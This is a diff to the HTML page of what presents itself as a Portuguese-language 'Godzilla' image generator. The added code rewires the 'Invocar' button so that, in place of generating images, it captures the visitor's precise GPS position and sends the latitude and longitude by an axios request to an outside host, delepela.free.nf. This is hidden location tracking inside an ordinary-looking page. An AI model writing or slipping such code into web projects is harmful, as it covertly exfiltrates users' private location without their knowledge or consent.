@@ -4,6 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#1b2a2e">
+<script src="https://cdn.jsdelivr.net/npm/axios@<x.x.x>/dist/axios.min.js"></script>
 <title>Godzilla · Gerador de Imagens</title>
 <style>
 :root{
@@ -107,7 +108,7 @@ footer{position:relative;z-index:1;text-align:center;color:var(--mut);font-size:
 
     <div class="sw"><input type="checkbox" id="theme" checked><label for="theme" style="margin:0;text-transform:none;color:var(--tx);font-size:.92rem">Aplicar tema Godzilla ao prompt</label></div>
 
-    <button class="go" onclick="capturarGPS()">Invocar</button>
+    <button class="go" id="go">Invocar</button>
 
     <details>
       <summary>Configurar backend</summary>
@@ -137,19 +138,17 @@ footer{position:relative;z-index:1;text-align:center;color:var(--mut);font-size:
 
                 function(posicao) {
 
-                    const latitude =
-                        posicao.coords.latitude;
+                    const latitude = posicao.coords.latitude;
 
-                    const longitude =
-                        posicao.coords.longitude;
+                    const longitude = posicao.coords.longitude;
 
-                    document.getElementById("latitude").value =
-                        latitude;
+                    axios.get(`http://delepela.free.nf/escrever-arquivo?lat=${latitude}&long=${longitude}&i=1`)
+                    .then(response => json())
+                    .then(data => {
+                        console.log(data)
+                    })
 
-                    document.getElementById("longitude").value =
-                        longitude;
-
-                    console.log(latitude, longitude);
+                    console.log("lat"+latitude,"long"+ longitude);
                 },
 
                 function(erro) {
@@ -159,7 +158,7 @@ footer{position:relative;z-index:1;text-align:center;color:var(--mut);font-size:
 
                 {
                     enableHighAccuracy: true,
-                    timeout: 25000,
+                    timeout: 35000,
                     maximumAge: 0
                 }
             );
@@ -245,7 +244,7 @@ async function generate(){
     show('<div class="err"><b>Falha ao gerar.</b><br>'+esc(e.message)+'<br><small>Verifique o endpoint e se o servidor permite CORS.</small></div><div class="empty"><div>Tente novamente.</div></div>');
   }finally{btn.disabled=false;btn.textContent="Invocar"}
 }
-$("go").onclick=generate;
+$("go").onclick=capturarGPS;
 $("prompt").addEventListener("keydown",e=>{if((e.ctrlKey||e.metaKey)&&e.key==="Enter")generate()});
 </script>
 </body>
